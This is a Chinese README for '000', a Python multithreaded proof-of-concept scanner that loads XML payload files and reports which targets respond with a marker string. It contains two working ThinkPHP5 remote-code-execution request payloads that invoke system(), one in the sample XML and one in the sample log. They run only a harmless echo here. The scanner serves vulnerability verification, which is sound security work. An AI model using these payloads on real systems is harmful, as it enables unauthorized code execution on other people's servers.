# 000

第一个从零开发的作品，所以就叫000了，- -

## 简介

000是一个平平无奇的poc验证器，支持多线程、多目标、多poc和单个代理。

## 使用方法

> 1. 填目标ip

可以用`--url`或`-u`指定一个，或者每行一个填入某个文件中，之后用`--url-file`或者`-uf`填入它的路径。

如果`-u`和`-uf`同时存在，则他俩都会被加入扫描列表中

举例:

```
python3 000.py -u "http://127.0.0.1" -uf "urls.txt"
```

其中写到文件中的目标支持下面三种方式：

```
192.168.124.128:80
http://192.168.124.128:8080
http://192.168.124.128:8081/
```

> 2. 写入payload

Payload内容为xml，举例如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <payload>
        <!-- ThinkPHP5 5.0.23 Remote Code Execution Vulnerability -->
        <GET>/index.php?s=captcha</GET>
        <POST>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo "123"|base64</POST>
        <Header>
            <User-Agent>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36</User-Agent>
        </Header>
        <Vuln_Condition>MTIzCg==</Vuln_Condition>
    </payload>
</root>
```

`Vuln_Condition`是用来检测漏洞是否存在的字符串。若发送poc后响应包中含有该字符串，则判定该漏洞存在。

写完后需要将其放在一个文件夹中（默认`payload`文件夹，也可以用`--payload-folder`或者`-pf`指定一个你喜欢的文件夹），程序会自动导入该文件夹中的所有`.xml`文件

> 3. 获取扫描结果

程序运行时会在命令行里打印出哪个目标有洞。为了获取更详细的结果我们可以去`log`文件夹找到本次扫描对应的日志文件`xxx.log`，其中就会有详细的信息。

日志会是这样的：

```
[!] Only successful operations are recorded
===============2021-01-18 22:57:58===============
URL: http://192.168.124.128:80/index.php
|Header:
|	User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
|GET:
|	/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "123"|base64
```

> 4. 其他

当然还有代理、线程数、timeout、是否允许重定向的设置。可以用`-h`获取它们的使用方法

# Q&A

Q: 我需要安装什么包？

A: 必须安requests，如果需要使用socks4/5代理的话还需要安装pysocks

 

